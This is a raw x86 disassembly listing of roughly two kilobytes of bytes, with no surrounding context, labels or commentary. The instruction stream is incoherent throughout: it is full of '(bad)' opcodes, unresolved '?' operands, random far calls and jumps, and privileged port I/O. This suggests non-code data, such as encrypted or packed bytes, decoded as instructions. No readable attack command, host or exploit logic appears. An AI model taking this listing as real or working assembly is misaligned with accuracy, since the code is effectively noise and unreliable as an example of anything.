  41e040:	fisubr WORD PTR [ebx-0x39]
  41e043:	ins    DWORD PTR es:[edi],dx
  41e044:	pop    es
  41e045:	(bad)  
  41e046:	add    ch,cl
  41e048:	jl     0x41e051
  41e04a:	jge    0x41e0c8
  41e04c:	add    esi,0x8a7b3bf5
  41e052:	(bad)  
  41e053:	pop    eax
  41e054:	push   edx
  41e055:	mov    edx,eax
  41e057:	loopne 0x41e006
  41e059:	jbe    0x41e018
  41e05b:	fwait
  41e05c:	nop
  41e05d:	cmp    al,0x38
  41e05f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e060:	sub    DWORD PTR [edi],esp
  41e062:	ficomp WORD PTR [esi]
  41e064:	adc    BYTE PTR [ebp+ebx*8+0x74],0x19
  41e069:	push   edx
  41e06a:	std    
  41e06b:	and    ebx,DWORD PTR [ecx]
  41e06d:	xchg   esi,eax
  41e06e:	fcom   DWORD PTR [eax+0x2f024560]
  41e074:	mov    bl,0x6d
  41e076:	mov    al,0xce
  41e078:	scas   al,BYTE PTR es:[edi]
  41e079:	call   0x84c1:0xaf06e71c
  41e080:	xchg   ecx,eax
  41e081:	and    BYTE PTR [edi],bh
  41e083:	and    dh,bl
  41e085:	pop    edi
  41e086:	add    DWORD PTR [esi+ebx*8-0x3],ecx
  41e08a:	idiv   edx
  41e08c:	jno    0x41e01a
  41e08e:	loope  0x41e01a
  41e090:	adc    al,0x0
  41e092:	inc    eax
  41e093:	push   esp
  41e094:	fistp  WORD PTR [ecx-0x93d891f]
  41e09a:	adc    bl,bl
  41e09c:	mov    dh,0x3c
  41e09e:	shr    DWORD PTR [eax],0x25
  41e0a1:	pop    esi
  41e0a2:	sbb    ebp,esp
  41e0a4:	jge    0x41e074
  41e0a6:	stc    
  41e0a7:	dec    ebx
  41e0a8:	xchg   ebx,eax
  41e0a9:	sets   al
  41e0ac:	(bad)
  41e0af:	push   0x2b2f470e
  41e0b4:	lods   al,BYTE PTR ds:[esi]
  41e0b5:	add    DWORD PTR [eax-0x1a],edx
  41e0b8:	lods   al,BYTE PTR ds:[esi]
  41e0b9:	and    eax,0xf6df0b1f
  41e0be:	int    0xd8
  41e0c0:	shl    DWORD PTR [edi-0x5c6689c],0x49
  41e0c7:	leave  
  41e0c8:	ins    DWORD PTR es:[edi],dx
  41e0c9:	into   
  41e0ca:	xor    DWORD PTR [ebp+0x9],esi
  41e0cd:	addr16 shl bl,0xcd
  41e0d1:	int3   
  41e0d2:	add    BYTE PTR [ebx-0x65cfcbfb],cl
  41e0d8:	fisttp WORD PTR [eax]
  41e0da:	js     0x41e0d8
  41e0dc:	aad    0x89
  41e0de:	adc    ah,cl
  41e0e0:	shl    ah,1
  41e0e2:	rol    DWORD PTR [esi],0x51
  41e0e5:	aad    0x2e
  41e0e7:	pop    edx
  41e0e8:	out    0xcf,eax
  41e0ea:	je     0x41e13a
  41e0ec:	ret    
  41e0ed:	stc    
  41e0ee:	test   BYTE PTR [ebx-0x5],ch
  41e0f1:	(bad)  
  41e0f2:	push   ecx
  41e0f3:	xor    eax,0xf147a012
  41e0f8:	mov    ebp,0x54c277e2
  41e0fd:	cli    
  41e0fe:	dec    esp
  41e0ff:	leave  
  41e100:	and    eax,0x4dc46360
  41e105:	loope  0x41e0eb
  41e107:	jmp    0xbcffab22
  41e10c:	dec    edx
  41e10d:	xor    bl,dl
  41e10f:	inc    esp
  41e110:	sar    BYTE PTR [edi],0xfd
  41e113:	xchg   esp,eax
  41e114:	mov    esi,0xbc8141b1
  41e119:	int    0x3
  41e11b:	xchg   BYTE PTR [esi+0x5c044237],ah
  41e121:	adc    ch,0xfb
  41e124:	int    0x25
  41e126:	call   0x3a151f38
  41e12b:	in     eax,dx
  41e12c:	dec    ecx
  41e12d:	retf   0x3ef7
  41e130:	pop    eax
  41e131:	retf   0x2348
  41e134:	outs   dx,DWORD PTR ds:[esi]
  41e135:	sbb    BYTE PTR [eax+0x2e],ah
  41e138:	test   BYTE PTR [edx],bl
  41e13a:	jmp    0x41e11a
  41e13c:	(bad)
  41e13f:	scas   al,BYTE PTR es:[edi]
  41e140:	add    eax,0xa7c3fcf1
  41e145:	pop    edi
  41e146:	imul   esp,DWORD PTR [eax+0x5b13108b],0x14
  41e14d:	repz mov bl,0x9f
  41e150:	jno    0x41e1ab
  41e152:	inc    eax
  41e153:	(bad)  
  41e154:	arpl   WORD PTR [ebx],bp
  41e156:	imul   ebp,DWORD PTR [edi-0x252f055a],0x4d
  41e15d:	mul    DWORD PTR [edx-0x40]
  41e160:	xchg   esi,eax
  41e161:	into   
  41e162:	test   eax,0xba7836e9
  41e167:	push   ss
  41e168:	jb     0x41e135
  41e16a:	jnp    0x41e128
  41e16c:	cmp    eax,0xe77296fe
  41e171:	bound  edi,QWORD PTR [edi]
  41e173:	dec    esp
  41e174:	adc    eax,DWORD PTR [esi-0x51]
  41e177:	xchg   esi,eax
  41e178:	mov    fs,WORD PTR [edi+0x6430edc4]
  41e17e:	lea    edx,[ebx+0x35fef978]
  41e184:	mov    eax,ds:0x6f033688
  41e189:	shl    BYTE PTR [esi],1
  41e18b:	mov    ds:0xb7d4e0d7,al
  41e190:	and    ebp,DWORD PTR [edx-0x29]
  41e193:	scas   al,BYTE PTR es:[edi]
  41e194:	clc    
  41e195:	lods   al,BYTE PTR ds:[esi]
  41e197:	xor    BYTE PTR [eax],bl
  41e199:	mov    BYTE PTR [edi],ah
  41e19b:	daa    
  41e19c:	arpl   WORD PTR [ebx+0xefd9231],dx
  41e1a2:	xchg   esp,eax
  41e1a3:	sub    cl,ch
  41e1a5:	xchg   esi,eax
  41e1a6:	sar    BYTE PTR [ecx],cl
  41e1a8:	push   edi
  41e1a9:	fidivr DWORD PTR [esi]
  41e1ab:	test   eax,0xfeca5889
  41e1b0:	sub    DWORD PTR [esi-0x4f8a4cf7],esp
  41e1b6:	jle    0x41e16f
  41e1b8:	icebp  
  41e1b9:	cmp    ah,BYTE PTR [ebx]
  41e1bb:	repz mov esi,ebp
  41e1be:	xchg   BYTE PTR [edx],dh
  41e1c0:	dec    esi
  41e1c1:	iret   
  41e1c2:	out    dx,al
  41e1c3:	(bad)  
  41e1c5:	enter  0x1550,0x2b
  41e1c9:	or     ah,BYTE PTR [edx-0x6586c5d1]
  41e1cf:	aaa    
  41e1d0:	ret    0x7920
  41e1d3:	in     eax,dx
  41e1d4:	(bad)  
  41e1d5:	outs   dx,DWORD PTR ds:[esi]
  41e1d6:	aaa    
  41e1d7:	or     esp,DWORD PTR [ebx+0x498f1769]
  41e1dd:	dec    esi
  41e1de:	ins    DWORD PTR es:[edi],dx
  41e1df:	mov    WORD PTR [edx+ecx*4-0x56cb750e],?
  41e1e6:	jmp    0x91291574
  41e1eb:	cli    
  41e1ec:	repnz or ebp,DWORD PTR [ecx+eax*8-0x7a]
  41e1f1:	enter  0x24a5,0xcd
  41e1f5:	leave  
  41e1f6:	bnd jb 0x41e186
  41e1f9:	cdq    
  41e1fa:	(bad)  [edi+esi*1-0x6f]
  41e1fe:	int3   
  41e1ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e200:	mov    DWORD PTR [edi-0xb],eax
  41e203:	mov    ebp,0xe626565f
  41e208:	jmp    0xa5e2:0xfbb56dc2
  41e20f:	inc    ebp
  41e210:	jno    0x41e20b
  41e212:	xor    esp,edx
  41e214:	imul   BYTE PTR [edi-0x119d2a78]
  41e21a:	ds (bad) 
  41e21c:	push   ebx
  41e21d:	push   esi
  41e21e:	cmp    eax,0x3e8f5214
  41e223:	imul   ebp,DWORD PTR [esi-0x62],0x3a841820
  41e22a:	test   BYTE PTR [edx+0x17],dh
  41e22d:	test   eax,0xccb7f019
  41e232:	sbb    eax,0xc00da351
  41e237:	add    eax,0x3812bc36
  41e23c:	fisub  DWORD PTR ds:0xbcb15f3a
  41e242:	or     DWORD PTR [eax-0x6],edi
  41e245:	sahf   
  41e246:	or     DWORD PTR [ebp+ebx*4+0x4d2353ec],eax
  41e24d:	or     BYTE PTR [ebx-0x7a],cl
  41e250:	retf   0xe6a4
  41e253:	sbb    BYTE PTR [esi+0x74a272],bh
  41e259:	loop   0x41e271
  41e25b:	xor    DWORD PTR [ecx+0x28],esi
  41e25e:	dec    ebp
  41e25f:	mov    ecx,0x594cbb22
  41e264:	fcmovnbe st,st(1)
  41e266:	(bad)  es:[esp+ebp*8-0x71cd6908]
  41e26e:	popf   
  41e26f:	sub    ebx,ebx
  41e271:	fistp  WORD PTR [esi-0x35578c5b]
  41e277:	stc    
  41e278:	repnz pop eax
  41e27a:	xor    ecx,DWORD PTR [ebx-0x55da78e3]
  41e280:	add    eax,0xde23a850
  41e285:	ja     0x41e283
  41e287:	lahf   
  41e288:	les    esi,FWORD PTR [ebx+0x67]
  41e28b:	push   ebp
  41e28c:	mov    eax,ds:0xb9f09154
  41e291:	fwait
  41e292:	or     eax,0xa0644110
  41e297:	imul   esi,DWORD PTR [edi-0x58a5569c],0x47420d5b
  41e2a1:	out    dx,al
  41e2a2:	inc    ebx
  41e2a3:	stos   DWORD PTR es:[edi],eax
  41e2a4:	fisttp DWORD PTR ds:0x2614124d
  41e2aa:	call   0x5275f5c9
  41e2af:	sbb    al,0x9a
  41e2b1:	ins    BYTE PTR es:[edi],dx
  41e2b2:	adc    eax,0x22d407de
  41e2b7:	scas   al,BYTE PTR es:[edi]
  41e2b8:	mov    WORD PTR [eax+0x3d],gs
  41e2bb:	test   eax,0x4413267
  41e2c0:	push   ecx
  41e2c1:	jo     0x41e28b
  41e2c3:	ret    0x3c4
  41e2c6:	jo     0x41e33f
  41e2c8:	je     0x41e293
  41e2ca:	mov    al,ds:0xa40e42ed
  41e2cf:	lds    esp,FWORD PTR [ebx-0x58a1d790]
  41e2d5:	mov    bh,0xee
  41e2d7:	retf   0xc933
  41e2da:	ins    BYTE PTR es:[edi],dx
  41e2db:	cwde   
  41e2dc:	lahf   
  41e2dd:	sub    al,0xb5
  41e2e0:	push   cs
  41e2e1:	inc    esi
  41e2e2:	into   
  41e2e3:	add    cl,BYTE PTR [esi-0x72]
  41e2e6:	xchg   ebp,eax
  41e2e7:	jae    0x41e33c
  41e2e9:	mov    dl,BYTE PTR [ebp+0x42]
  41e2ec:	adc    eax,0x39d2a172
  41e2f1:	loopne 0x41e2c0
  41e2f3:	repz (bad) 
  41e2f5:	idiv   BYTE PTR [ebx+0x3]
  41e2f8:	and    DWORD PTR [edi+0x1b909ee8],edx
  41e2fe:	shl    ebp,cl
  41e300:	push   eax
  41e301:	js     0x41e31a
  41e303:	imul   ebp,ebx,0x546dccce
  41e309:	push   edi
  41e30a:	and    BYTE PTR [ebx],cl
  41e30c:	jbe    0x41e2dd
  41e30e:	fwait
  41e30f:	fwait
  41e310:	lds    esp,FWORD PTR [ebx-0x31]
  41e313:	pop    ebx
  41e314:	fidivr DWORD PTR [edi-0x80]
  41e317:	sub    edi,edi
  41e319:	das    
  41e31a:	enter  0x33dc,0x94
  41e31e:	sub    al,BYTE PTR ss:[ebp-0x561b7781]
  41e325:	jbe    0x41e380
  41e327:	popa   
  41e328:	sbb    al,ah
  41e32a:	xchg   bh,al
  41e32c:	daa    
  41e32d:	fsubr  DWORD PTR [ebp+0x70]
  41e330:	repnz sub al,0x17
  41e333:	fwait
  41e334:	sub    al,0x68
  41e336:	adc    BYTE PTR [ebx],cl
  41e338:	retf   
  41e339:	ret    0xa250
  41e33c:	mov    al,ds:0x6a8b6880
  41e341:	inc    ebx
  41e342:	and    al,dh
  41e344:	sub    ah,cl
  41e346:	sbb    BYTE PTR [esi-0x758c414c],dh
  41e34c:	iret   
  41e34d:	sub    edx,DWORD PTR [edi+0x12eb9a1f]
  41e353:	int    0xcb
  41e355:	dec    ebp
  41e356:	xor    DWORD PTR [ebx],edx
  41e358:	cdq    
  41e359:	jbe    0x41e30c
  41e35b:	std    
  41e35c:	and    al,0x13
  41e35e:	mov    dl,0x34
  41e360:	adc    esp,DWORD PTR [eax+0x44baeabc]
  41e366:	mov    ebp,0x3a31ca32
  41e36b:	retf   0x5526
  41e36e:	jmp    0xa5a3:0x822b1b8
  41e375:	mov    ch,0x9c
  41e377:	call   ebp
  41e379:	jmp    0x80dd:0x6bd6c6ba
  41e380:	out    0xd4,al
  41e382:	clc    
  41e383:	pop    ebx
  41e384:	ror    BYTE PTR [eax+0x4d],cl
  41e387:	mov    DWORD PTR [esp+edx*2-0x1913bc0e],esp
  41e38e:	cs data16 in al,dx
  41e391:	in     eax,dx
  41e392:	and    al,0x7e
  41e394:	inc    edi
  41e395:	call   0x880b2da7
  41e39a:	jne    0x41e36b
  41e39c:	mov    ebx,0xc59eb475
  41e3a1:	js     0x41e419
  41e3a3:	shl    BYTE PTR fs:[esi+0x643db94f],1
  41e3aa:	sbb    dh,BYTE PTR [ebp+0x20c7e3aa]
  41e3b0:	mov    bl,0x6f
  41e3b2:	lods   eax,DWORD PTR ds:[esi]
  41e3b3:	xor    BYTE PTR [esi+eiz*1],dl
  41e3b6:	repz sub al,0xb3
  41e3b9:	xor    al,0xd0
  41e3bb:	push   edx
  41e3bc:	dec    esi
  41e3bd:	xchg   edi,eax
  41e3be:	jge    0x41e3ca
  41e3c0:	jg     0x41e403
  41e3c2:	xchg   ebp,eax
  41e3c3:	sbb    esi,edi
  41e3c5:	mov    eax,ds:0x6607cfd
  41e3ca:	shl    DWORD PTR [ebp+0x52],1
  41e3cd:	ret    0x3b88
  41e3d0:	xlat   BYTE PTR ds:[ebx]
  41e3d1:	jns    0x41e3c0
  41e3d3:	mov    ds,WORD PTR [edx-0x27f00e40]
  41e3d9:	fild   QWORD PTR [esp+ebp*4-0x7b]
  41e3dd:	adc    eax,0x4d656fc0
  41e3e2:	cmp    BYTE PTR [ebp+0x640e7164],ah
  41e3e8:	sub    eax,0x7606eaec
  41e3ed:	xchg   ebp,eax
  41e3ee:	mov    bh,0xa7
  41e3f0:	stos   BYTE PTR es:[edi],al
  41e3f1:	cmc    
  41e3f2:	loopne 0x41e389
  41e3f4:	shr    BYTE PTR [ecx-0x5d77674e],0x2c
  41e3fb:	mov    esp,0xaf4718b5
  41e400:	add    eax,0xa7db6e4c
  41e405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e406:	inc    ebx
  41e407:	xlat   BYTE PTR ds:[ebx]
  41e408:	gs nop
  41e40a:	aaa    
  41e40b:	mov    cl,0xa6
  41e40d:	xlat   BYTE PTR ds:[ebx]
  41e40e:	ins    BYTE PTR es:[edi],dx
  41e40f:	jmp    0x1533efca
  41e414:	jg     0x41e421
  41e416:	xchg   edi,eax
  41e417:	imul   edi,DWORD PTR [esi-0x38],0xffffffb8
  41e41b:	ins    BYTE PTR es:[edi],dx
  41e41c:	or     DWORD PTR [ebp+0x783db8ab],eax
  41e422:	shr    BYTE PTR [esi-0x7],1
  41e425:	scas   eax,DWORD PTR es:[edi]
  41e426:	dec    edx
  41e427:	adc    edx,DWORD PTR [esi+0x2502fa7a]
  41e42d:	div    DWORD PTR [eax+0x6b]
  41e430:	add    ebx,ebp
  41e432:	push   esp
  41e433:	hlt    
  41e434:	pusha  
  41e435:	out    0xee,al
  41e437:	jle    0x41e3ef
  41e439:	or     BYTE PTR [esi+0x410d2876],al
  41e43f:	fcomp  DWORD PTR [edx+0x12b86df8]
  41e445:	call   DWORD PTR gs:0xf09282f4
  41e44c:	mov    bl,0x2b
  41e44e:	and    BYTE PTR [eax+edi*4],ch
  41e451:	mov    al,ds:0xf205bcae
  41e456:	daa    
  41e457:	fdivr  QWORD PTR [eax-0x486e0c64]
  41e45d:	pop    ds
  41e45e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e45f:	addr16 inc esp
  41e461:	ins    BYTE PTR es:[edi],dx
  41e462:	jge    0x41e407
  41e464:	(bad)  
  41e465:	jb     0x41e49a
  41e467:	inc    ecx
  41e468:	inc    ebx
  41e469:	mov    dh,0x5e
  41e46b:	inc    edx
  41e46c:	pop    eax
  41e46d:	les    edi,FWORD PTR [ebp+0x1384b925]
  41e473:	mov    bl,0x8
  41e475:	jmp    0x45aae30c
  41e47a:	push   ss
  41e47b:	daa    
  41e47c:	cmp    al,0x75
  41e47e:	ret    0xf137
  41e481:	pop    ebp
  41e482:	mov    ah,0xe6
  41e484:	sbb    DWORD PTR [edi],0xfffffff6
  41e487:	loopne 0x41e41f
  41e489:	jl     0x41e40d
  41e48b:	push   eax
  41e48c:	fiadd  WORD PTR [ebp+eiz*2+0x2b31f053]
  41e493:	rcr    DWORD PTR [eax+ecx*1-0x481ef91f],cl
  41e49a:	and    ebx,DWORD PTR ds:0xc2fb77eb
  41e4a0:	rcl    BYTE PTR [bp+si],0xd8
  41e4a4:	in     eax,dx
  41e4a5:	inc    esi
  41e4a6:	adc    bl,BYTE PTR [edi+0x121974e9]
  41e4ac:	pop    ss
  41e4ad:	fsub   QWORD PTR [ecx-0x21]
  41e4b0:	enter  0xf83c,0xac
  41e4b4:	retf   
  41e4b5:	mov    bl,0x38
  41e4b7:	add    DWORD PTR [ebp+ebx*8-0x6e9e420c],ebp
  41e4be:	aad    0x55
  41e4c0:	sbb    BYTE PTR [ecx+0x371ae79e],cl
  41e4c6:	jns    0x41e463
  41e4c8:	xor    DWORD PTR [ebx+0x64],ecx
  41e4cb:	xchg   esi,eax
  41e4cc:	das    
  41e4cd:	inc    edx
  41e4ce:	adc    esp,edi
  41e4d0:	out    dx,al
  41e4d1:	shl    BYTE PTR [edx],1
  41e4d3:	rcr    ebx,1
  41e4d5:	pop    esp
  41e4d6:	and    al,0x7d
  41e4d8:	mov    dh,0xb8
  41e4da:	sbb    DWORD PTR [edi],edx
  41e4dc:	sub    ah,BYTE PTR [esp+edi*8]
  41e4df:	mov    eax,ds:0x35190a25
  41e4e4:	jb     0x41e480
  41e4e6:	push   esi
  41e4e7:	jmp    0x41e49a
  41e4e9:	int3   
  41e4ea:	jo     0x41e498
  41e4ec:	inc    ebp
  41e4ed:	push   edi
  41e4ee:	dec    esi
  41e4ef:	xor    al,0x15
  41e4f1:	cli    
  41e4f2:	dec    ebp
  41e4f3:	jp     0x41e4f9
  41e4f5:	rcl    DWORD PTR [ecx+esi*8+0x1a],0x47
  41e4fa:	add    BYTE PTR [ebp+edi*1-0x5e],bh
  41e4fe:	in     eax,dx
  41e4ff:	fwait
  41e500:	bound  edi,QWORD PTR [esi-0x1d]
  41e503:	dec    ecx
  41e504:	adc    bh,dl
  41e506:	rol    BYTE PTR [eax],1
  41e508:	sub    dl,bh
  41e50a:	and    eax,0xdade33c4
  41e50f:	retf   
  41e510:	push   DWORD PTR [ecx+0x60]
  41e513:	pop    ds
  41e514:	xor    al,0x8a
  41e516:	fimul  WORD PTR [eax]
  41e518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e519:	lock push ebp
  41e51b:	or     eax,0x322d7aef
  41e520:	pop    eax
  41e521:	inc    ebp
  41e522:	ja     0x41e50a
  41e524:	mov    ebp,0x332a5a4
  41e529:	rcl    DWORD PTR ds:0x2c390c53,0x8a
  41e530:	int3   
  41e531:	pop    esi
  41e532:	fnstsw WORD PTR [esi-0x52]
  41e535:	lds    edi,FWORD PTR [eax-0x7b96e0aa]
  41e53b:	xchg   ch,ah
  41e53d:	cmp    DWORD PTR [ecx],0xfffffff6
  41e540:	rol    BYTE PTR [ecx],0xbf
  41e543:	push   ebp
  41e544:	imul   edi,DWORD PTR [esi-0x11],0x51
  41e548:	out    dx,eax
  41e549:	int    0x5e
  41e54b:	or     BYTE PTR [esi-0x1c],ah
  41e54e:	pop    ebp
  41e54f:	xor    eax,0xfd2853e4
  41e554:	shl    ebp,0x0
  41e557:	rcr    ah,0x26
  41e55a:	push   0xffffffab
  41e55c:	mov    bh,0xe3
  41e55e:	sub    bl,al
  41e560:	fsub   DWORD PTR [ebp+0x7]
  41e563:	jp     0x41e513
  41e565:	cmp    DWORD PTR [ebx-0x32],esp
  41e568:	adc    al,0x91
  41e56a:	pop    es
  41e56b:	test   al,0x3b
  41e56d:	push   ss
  41e56e:	and    edi,eax
  41e570:	hlt    
  41e571:	mov    ecx,0x4700519c
  41e576:	shr    DWORD PTR [esi+0x2f27d675],cl
  41e57c:	hlt    
  41e57d:	mov    ?,edi
  41e57f:	adc    ecx,edx
  41e581:	sub    al,0x74
  41e583:	xor    ch,bh
  41e585:	sti    
  41e586:	ins    DWORD PTR es:[edi],dx
  41e587:	mov    al,0xbb
  41e589:	int    0xf8
  41e58b:	adc    eax,0xcee8ac59
  41e590:	push   eax
  41e591:	xchg   esi,eax
  41e592:	add    ch,BYTE PTR [eax-0x43]
  41e595:	iret   
  41e596:	pop    ecx
  41e597:	std    
  41e598:	mov    al,ds:0xcffae2ce
  41e59d:	es mov ch,0x7a
  41e5a0:	xor    bl,BYTE PTR [ebx]
  41e5a2:	cmp    eax,0xc6a6f7f8
  41e5a7:	mov    dl,0x5
  41e5a9:	jno    0x41e57d
  41e5ab:	aaa    
  41e5ac:	call   0xeef4:0x4f7d787b
  41e5b3:	call   0x6143:0x5aca8d85
  41e5ba:	dec    edi
  41e5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e5bc:	or     eax,0x6094c45d
  41e5c1:	mov    bl,0x75
  41e5c3:	add    eax,0x2c3b836f
  41e5c8:	sub    al,0xb3
  41e5ca:	in     al,dx
  41e5cb:	in     eax,0xd7
  41e5cd:	fnstcw WORD PTR [eax+0x7109ecec]
  41e5d3:	add    BYTE PTR [ebx+0x70482929],bh
  41e5d9:	dec    esp
  41e5da:	pop    ebx
  41e5db:	aad    0x87
  41e5dd:	push   ebp
  41e5de:	xor    edx,eax
  41e5e0:	mov    ecx,0x3660ba71
  41e5e5:	fs lahf 
  41e5e7:	or     BYTE PTR ds:0x5df3e134,bh
  41e5ed:	arpl   WORD PTR [ecx],si
  41e5ef:	adc    eax,0x91e536e1
  41e5f4:	rol    bh,cl
  41e5f6:	repz mov ebx,0x669e9cff
  41e5fc:	mov    edi,0xd92027c1
  41e601:	xchg   ebx,eax
  41e602:	or     BYTE PTR [ebp-0x4681ece0],al
  41e608:	bound  esp,QWORD PTR [ebx-0x17]
  41e60b:	pop    edx
  41e60c:	int3   
  41e60d:	or     ebx,esi
  41e60f:	daa    
  41e610:	push   esp
  41e611:	ds sub esp,ebx
  41e614:	(bad)  
  41e615:	ins    BYTE PTR es:[edi],dx
  41e616:	icebp  
  41e617:	adc    eax,0x15f5ebe4
  41e61c:	out    0xad,eax
  41e61e:	nop
  41e61f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e620:	add    al,0x86
  41e622:	push   0xe
  41e624:	push   ds
  41e625:	pop    eax
  41e626:	sbb    BYTE PTR gs:[eax-0x1ca6a35d],bl
  41e62d:	mov    ds:0x7b0ff8e8,eax
  41e632:	aam    0x66
  41e634:	sbb    edx,DWORD PTR [edi+0x4cdc2c1e]
  41e63a:	sti    
  41e63b:	push   ds
  41e63c:	es inc ecx
  41e63e:	cmp    BYTE PTR [esi-0x7c],bl
  41e641:	pop    esp
  41e642:	lahf   
  41e643:	sbb    DWORD PTR [edx+0x38],esi
  41e646:	(bad)  
  41e648:	(bad)  
  41e649:	mov    edx,0xbb45a7de
  41e64e:	xor    DWORD PTR [edx+ebx*1+0x7a1ded21],ebp
  41e655:	(bad)  
  41e657:	jecxz  0x41e67b
  41e659:	dec    ebp
  41e65a:	shr    BYTE PTR [eax],1
  41e65c:	ja     0x41e6db
  41e65e:	xor    ch,BYTE PTR [eax]
  41e660:	jecxz  0x41e62b
  41e662:	fiadd  DWORD PTR [edi]
  41e664:	popf   
  41e665:	push   esp
  41e666:	sbb    BYTE PTR [edx-0x6],ch
  41e669:	push   0x9349f3c1
  41e66e:	and    al,0xd1
  41e670:	cs in  al,0x8e
  41e673:	mov    ebx,0x96478539
  41e678:	mov    edi,0xa7d4bb13
  41e67d:	jmp    0x3ddf:0xf698311b
  41e684:	xor    BYTE PTR [ebp-0x26],ah
  41e687:	pop    ecx
  41e688:	int    0x29
  41e68a:	int    0x62
  41e68c:	addr16 jne 0x41e65c
  41e68f:	inc    edx
  41e690:	lods   eax,DWORD PTR ds:[esi]
  41e691:	and    al,0x4d
  41e693:	fdiv   DWORD PTR [eax]
  41e695:	cmp    esi,DWORD PTR [ebx+ecx*1]
  41e698:	mov    esi,gs
  41e69a:	add    al,0x1e
  41e69c:	(bad)  
  41e69d:	int    0xdc
  41e69f:	test   cl,dh
  41e6a1:	mov    esi,0x3feac31a
  41e6a6:	xlat   BYTE PTR ds:[ebx]
  41e6a7:	out    0x69,eax
  41e6a9:	add    BYTE PTR [ebp+0x4707b4d0],ch
  41e6af:	sbb    eax,0x7f4a4d41
  41e6b4:	sub    BYTE PTR [edx-0x4],ah
  41e6b7:	cs inc esp
  41e6b9:	inc    esi
  41e6ba:	clc    
  41e6bb:	popf   
  41e6bc:	ror    BYTE PTR [edi-0x3c],cl
  41e6bf:	icebp  
  41e6c0:	pop    ebp
  41e6c1:	ficom  DWORD PTR [eax-0x28]
  41e6c4:	cs sahf 
  41e6c6:	adc    BYTE PTR [ecx],0x5e
  41e6c9:	inc    esi
  41e6ca:	push   0x6f
  41e6cc:	in     eax,dx
  41e6cd:	xlat   BYTE PTR ds:[ebx]
  41e6ce:	adc    DWORD PTR [eax],edi
  41e6d0:	dec    esi
  41e6d1:	(bad)  
  41e6d2:	cdq    
  41e6d3:	jb     0x41e683
  41e6d5:	repz enter 0xefe4,0x30
  41e6da:	les    edi,FWORD PTR [eax]
  41e6dc:	loope  0x41e68c
  41e6de:	test   eax,0xc423a939
  41e6e3:	mov    al,ds:0x3b713424
  41e6e8:	add    ebx,DWORD PTR [edx]
  41e6ea:	add    bl,BYTE PTR [eax+0x65b4e497]
  41e6f0:	cdq    
  41e6f1:	shr    ebp,cl
  41e6f3:	retf   
  41e6f4:	dec    esp
  41e6f5:	dec    esp
  41e6f6:	jle    0x41e755
  41e6f8:	call   0xfa70:0xd9ad7094
  41e6ff:	(bad)
  41e702:	ror    BYTE PTR [edi-0x1231e1c3],1
  41e708:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e709:	xchg   DWORD PTR [esi],esi
  41e70b:	sbb    esp,esp
  41e70d:	push   ds
  41e70e:	and    eax,0x57fd4f1
  41e713:	ret    
  41e714:	cmp    DWORD PTR [ecx+edx*1],esp
  41e717:	sub    al,0x73
  41e719:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e71a:	or     DWORD PTR [esi-0x4b],edi
  41e71d:	mov    BYTE PTR [edx+0x54],cl
  41e720:	add    ch,BYTE PTR [edx+0x5b47a02f]
  41e726:	jae    0x41e768
  41e728:	mov    ecx,0xf1ade61c
  41e72d:	popf   
  41e72e:	ins    BYTE PTR es:[edi],dx
  41e72f:	rol    DWORD PTR [ecx+0x22],cl
  41e732:	sbb    dl,BYTE PTR [esi]
  41e734:	sbb    ax,0x63cd
  41e738:	jl     0x41e72d
  41e73a:	jno    0x41e76f
  41e73c:	outs   dx,BYTE PTR ds:[esi]
  41e73d:	hlt    
  41e73e:	push   esp
  41e73f:	and    edx,DWORD PTR [ebx-0x685c8227]
  41e745:	in     al,0x66
  41e747:	add    ah,bl
  41e749:	leave  
  41e74a:	cmp    ah,bh
  41e74c:	test   DWORD PTR [ebp-0x4771f9de],edi
  41e752:	ror    BYTE PTR ds:0x4629c5fa,cl
  41e758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e759:	sbb    eax,0xb9de900
  41e75e:	cmp    DWORD PTR [ebp+0x23],ecx
  41e761:	ret    
  41e762:	in     eax,0x35
  41e764:	add    DWORD PTR [ebx+0x6dd3f2a4],edx
  41e76a:	int3   
  41e76b:	pop    ebx
  41e76c:	std    
  41e76d:	mov    al,0xb1
  41e76f:	jecxz  0x41e77d
  41e771:	xor    cl,bh
  41e773:	mov    BYTE PTR [edi-0x17],al
  41e776:	cmp    BYTE PTR [edx+0x4a1eaf03],dh
  41e77c:	jp     0x41e778
  41e77e:	dec    edi
  41e77f:	mov    bh,0xb3
  41e781:	fs jmp 0x41e7a0
  41e784:	jne    0x41e7b6
  41e786:	or     BYTE PTR [ecx+0x57],bl
  41e789:	int3   
  41e78a:	xor    DWORD PTR [eax],0xffffffc1
  41e78d:	(bad)  
  41e78e:	xchg   esp,eax
  41e78f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e790:	lds    edi,FWORD PTR [ecx+0x26]
  41e793:	fidivr WORD PTR [esi+0x6b]
  41e796:	in     eax,dx
  41e797:	(bad)  
  41e798:	(bad)  
  41e799:	push   cs
  41e79a:	mov    edx,?
  41e79c:	lea    ecx,[edi]
  41e79e:	in     eax,0x1a
  41e7a0:	bound  eax,QWORD PTR [esi]
  41e7a2:	add    al,0xc0
  41e7a4:	arpl   WORD PTR [esi],ax
  41e7a6:	adc    ah,BYTE PTR [ecx+0x69]
  41e7a9:	pop    ebp
  41e7aa:	sar    BYTE PTR [ebp-0x2ce24b16],0x9e
  41e7b1:	loope  0x41e78b
  41e7b3:	test   al,0xe7
  41e7b5:	mov    ds:0xdf28a42,eax
  41e7ba:	fcom   QWORD PTR [edi+ebx*8-0x3da673ba]
  41e7c1:	sub    ebx,DWORD PTR [esi]
  41e7c3:	mov    dl,0xa1
  41e7c5:	pop    edx
  41e7c6:	dec    esi
  41e7c7:	adc    BYTE PTR [edi],ch
  41e7c9:	sub    edi,DWORD PTR [ecx]
  41e7cb:	dec    edx
  41e7cc:	inc    ebp
  41e7cd:	mov    bh,0x61
  41e7cf:	hlt    
  41e7d0:	pop    es
  41e7d1:	dec    esi
  41e7d2:	pop    eax
  41e7d3:	das    
